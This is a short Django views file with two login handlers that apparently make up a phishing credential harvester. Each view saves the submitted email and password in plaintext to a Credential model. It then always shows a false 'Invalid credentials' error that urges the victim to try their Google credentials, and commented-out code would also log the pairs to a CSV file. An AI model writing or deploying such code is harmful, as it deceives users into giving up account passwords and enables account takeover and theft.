import csv
from django.contrib import messages
from django.shortcuts import render
from .models import Credential

# Create your views here.
def login(request):
    if request.method == 'POST':
        email = request.POST.get('email')
        password = request.POST.get('password')

        #print(f"Received email: {email}, password: {password}")
        #with open('profile.csv', 'a', newline='') as file:
            #writer = csv.writer(file)
            #writer.writerow([email, password])

        if email and password:
            messages.error(request, 'Invalid credentials. Try logging in with google credentials')

            user = Credential(email=email, password=password)
            user.save()

    return render(request, 'login.html')

def login2(request):
    if request.method == 'POST':
        email2 = request.POST.get('email')
        password2 = request.POST.get('password')

        #print(f"Received email: {email}, password: {password}")
        #with open('profile.csv', 'a', newline='') as file:
            #writer = csv.writer(file)
            #writer.writerow([email, password])

        if email2 and password2:
            messages.error(request, 'Invalid credentials. Try logging in with google credentials')

            user = Credential(email2=email2, password2=password2)
            user.save()

    return render(request, 'login2.html')